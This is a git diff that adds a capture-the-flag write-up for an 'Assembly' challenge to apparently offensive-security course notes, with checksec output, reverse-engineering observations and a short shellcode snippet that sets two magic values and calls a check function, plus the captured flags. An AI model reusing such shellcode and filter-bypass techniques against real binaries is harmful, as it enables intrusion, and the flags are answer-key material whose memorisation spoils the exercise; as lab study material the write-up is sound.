@@ -149,9 +149,60 @@ $ cat flag.txt
 flag{w3_c4n_st1ll_d3f34t_m0d3rn_c0d3!_853e98c9add95dbe}
 ```
 
-    
+## Challenge - Assembly
+```aiignore
+No BOF needed this time. Just set the right values to get the flag!
 
+nc offsec-chalbroker.osiris.cyber.nyu.edu 1294
+```
+```aiignore
+pwn checksec --file=assembly
+[*] '/mnt/csgy9223_IntroOffSec/week_6/assembly'
+    Arch:       amd64-64-little
+    RELRO:      Partial RELRO
+    Stack:      Canary found
+    NX:         NX enabled
+    PIE:        No PIE (0x400000)
+    SHSTK:      Enabled
+    IBT:        Enabled
+    Stripped:   No
+```
+Parial RELRO, Stack canary and No PIE
 
+Running the binary:
+```aiignore
+$ ./assembly
+Set the right secrets to get the flag!
+
+Segmentation fault
+```
+The segmentation fault is a hint. Binja time!
+
+Looks like it runs buf as a function call. There is a call to validate that looks for consecutive bytes of 0x62, 0x69 and 0x6e (bin) or 0x73, 0x79 and 0x73 (sys). 
+Well that puts a damper on syscall and /bin/sh. There is a function called check, that if secrets == 0x1badb002 && data_404098 == 0xdead10cc, then it prints the flag.
+
+I think what I need to do is write the assembly to set those values. There is a symbol for "secrets":
+```aiignore
+readelf -Ws assembly | grep secrets
+    18: 0000000000404090    16 OBJECT  GLOBAL DEFAULT   26 secrets
+```
+And data is 8 bytes after. Let's see if this works.
+
+shell code:
+```aiignore
+shell_code = f'''
+mov rax, 0x1badb002
+mov [{hex(secrets)}], rax
+mov rax, 0xdead10cc
+mov [{hex(secrets)}+8], rax
+mov eax, 0x0
+mov rdx, {hex(check)}
+call rdx
+```
+Got the flag:
+```aiignore
+Here's your flag, friend: flag{l0w_l3v3l_pr0gr4mm1ng_l1k3_4_pr0!_385a7d17fa48e363}
+```
 
 
 
